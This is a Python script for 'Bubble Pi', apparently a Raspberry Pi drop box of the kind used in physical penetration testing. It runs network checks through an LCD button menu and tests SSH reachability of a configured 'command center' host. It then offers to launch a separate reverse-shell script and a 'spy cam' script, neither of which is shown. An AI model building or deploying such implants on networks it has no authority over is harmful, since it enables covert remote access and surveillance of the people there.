#! /usr/bin/env python
# Bubble Pi
# Based on Rogue Pi by Kalen Wessel
# 
# 
# Author - Morgan Habecker
 
from time import sleep
from Adafruit_I2C import Adafruit_I2C
from Adafruit_MCP230xx import Adafruit_MCP230XX
from Adafruit_CharLCDPlate import Adafruit_CharLCDPlate
from subprocess import call
from sys import exit
from ConfigParser import SafeConfigParser
 
import smbus
import subprocess
import re
import socket
import fcntl
import struct
import paramiko
import socket
import signal

#--------------- CHANGE IF NECESSARY ---------------
# Interface (wireless or ethernet)
iface = 'eth0'
# Reverse shell script location
rs = "/root/bubblePi/tunnel.sh"
# Camera script location
spycam = "/root/bubblePi/cam.sh"
#--------------- CHANGE IF NECESSARY ---------------


# INI file config file
# Load in user name and IP address of command center 
# for the reverse shell test
parser = SafeConfigParser()
parser.read('/root/bubblePi/shell.conf')
 
ccIP = parser.get('reverse_shell', 'reverseDest')
 
# initialize the LCD plate
# use busnum = 0 for raspi version 1 (256MB) and busnum = 1 for version 2
lcd = Adafruit_CharLCDPlate(busnum = 1)
 
def TimeoutException(): 
	lcd.clear()
	lcd.backlight(lcd.OFF)
	exit()
 
def timeout(signum, frame):
    raise TimeoutException()
 
# Function which gets the IP address of a network interface
def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])

# Function which gets the Default Gateway IP address
def get_gateway(ifname):
 
    proc = subprocess.Popen("ip route list dev " + ifname + " | awk ' /^default/ {print $3}'", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
 
    return_code = proc.wait()
    for line in proc.stdout:
        line
 
    return line

# Define reverse shell and camera settings
def rev_shell():
	rev = subprocess.Popen(rs, shell=True)

def cam_start():
	runcam = subprocess.Popen(spycam, shell=True)

# Start making choices
def choice_cam():
	lcd.clear()
	lcd.message(" Start  Camera?")
	sleep(2)
	lcd.clear()
	lcd.message("Left = No\nRight = Yes")
	while 1:
		if (lcd.buttonPressed(lcd.RIGHT)):
			cam_start()
			lcd.clear()
			lcd.message("    Spy Cam\n    Running!")
			sleep(2)
			lcd.clear()
			lcd.message("Done!")
			sleep(1)
			lcd.clear()
			lcd.backlight(lcd.OFF)
			exit()
		if (lcd.buttonPressed(lcd.LEFT)):
			lcd.clear()
			lcd.message("Exiting")
			sleep(2)
			lcd.clear()
			lcd.backlight(lcd.OFF)
			exit()

def choice_shell():
	lcd.clear()
	lcd.message("   Run Reverse\n     Shell?")
	sleep(1)
	lcd.clear()
	lcd.message("Left = No\nRight = Yes")
	while 1:
		if (lcd.buttonPressed(lcd.RIGHT)):
			rev_shell()
			lcd.clear()
			lcd.message("Shell Running!")
			sleep(2)
			choice_cam()
		if (lcd.buttonPressed(lcd.LEFT)):
			lcd.clear()
			choice_cam()


def choice_init():
	lcd.clear()
	lcd.message("Run test again?")
	sleep(2)
	lcd.clear()
	lcd.message("Left = YES\nRight = NO")
	while 1:
		if (lcd.buttonPressed(lcd.LEFT)):
			lcd.clear()
			lcd.message("Running Test")
			sleep(1)
			init_test()
		if (lcd.buttonPressed(lcd.RIGHT)):
			choice_shell()


    
# Function for running all of the system tests
def init_test():
 
	# clear display
	lcd.clear()
 
	# Starting On Board System Check
	lcd.backlight(lcd.ON)
	lcd.message("   Bubble Pi\n  System Check")
	sleep(1)
 
	# ---------------------
	# | Ping System Check |
	# ---------------------
 
	# Put stderr and stdout into pipes
	proc = subprocess.Popen("ping -c 2 google.com 2>&1", \
			shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
 
	return_code = proc.wait()
 
	# Read from pipes
	# stdout
	for line in proc.stdout:
		if "loss" in line:
			packet_loss = progress = re.search('\d*%',line).group()
			if int(packet_loss.split('%')[0]) > 0:
				lcd.clear()
				lcd.message("Ping Google:\nFailed")
				sleep(2)
			else:
				lcd.clear()
				lcd.message("Ping Google:\nSuccess")
				sleep(2)
	#stderr
	for line in proc.stderr:
		print("stderr: " + line.rstrip())
 
	# --------------------
	# | Ping Default GW  |
	# --------------------
	ip_gateway = get_gateway(iface)
 
	proc = subprocess.Popen ("ping -c 2 " + ip_gateway + " 2>&1", \
			shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
 
	return_code = proc.wait()
 
	# Read from pipes
	# stdout
	for line in proc.stdout:
	   if "loss" in line:
		   packet_loss = re.search('\d*%',line).group()
		   if int(packet_loss.split('%')[0]) > 0:
			   lcd.clear()
			   lcd.message("Ping Gateway:\nFailed")
			   sleep(1)
		   else:
			   lcd.clear()
			   lcd.message("Ping Gateway:\nSuccess")
			   sleep(1)
	for line in proc.stderr:
		print("stderr: " + line.rstrip())
 
	# --------------------
	# | DHCP IP Address  |
	# --------------------
 
	try :
		ip_address = get_ip_address(iface)
		lcd.clear()
		lcd.message("IP:\n" + ip_address)
		sleep(1)
	except :
		lcd.clear()
		lcd.message("No IP obtained")
		sleep(1)
 
	# -------------------
	# |  Reverse Shell  |
	# -------------------
	try:
		ssh = paramiko.SSHClient()
		ssh.load_system_host_keys()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(ccIP, username='guest', password='none')
	except paramiko.AuthenticationException:
		lcd.clear()
		lcd.message("Reverse Tunnel:\nSuccess")
		sleep(1)
	except socket.error:
		lcd.clear()
		lcd.message("Reverse Shell: \nFailed")
		sleep(1)
	# Start Running shell and camera options
	choice_init()


# Start the on board system check
init_test()			
 

